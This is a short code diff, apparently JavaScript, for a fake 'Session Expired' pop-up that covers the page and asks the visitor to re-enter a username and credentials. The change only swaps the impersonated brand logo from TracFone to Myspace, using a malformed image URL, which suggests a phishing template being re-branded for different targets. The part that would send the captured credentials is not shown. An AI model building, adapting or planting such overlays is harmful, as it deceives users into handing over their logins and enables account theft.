@@ -8,7 +8,7 @@ div.style.padding = '20px';
 div.style.boxShadow = '0 0 10px rgba(0,0,0,0.5)';
 div.style.zIndex = '9999';
 div.innerHTML = `
-<img src="//tracfone.com/content/dam/tracfone/logos/TF_LOGO_desktop_lg.svg" alt="Placeholder" style="width:80px; height:80px; margin-right:20px; border-radius:8px;">
+<img src="//https://1000logos.net/wp-content/uploads/2023/01/Myspace-logo-1536x864.png" alt="Placeholder" style="width:80px; height:80px; margin-right:20px; border-radius:8px;">
     <h2>Session Expired</h2>
     <p>Please re-enter your credentials:</p>
     <input type="text" id="uName" placeholder="Username" required style="display:block; margin-bottom:10px;">
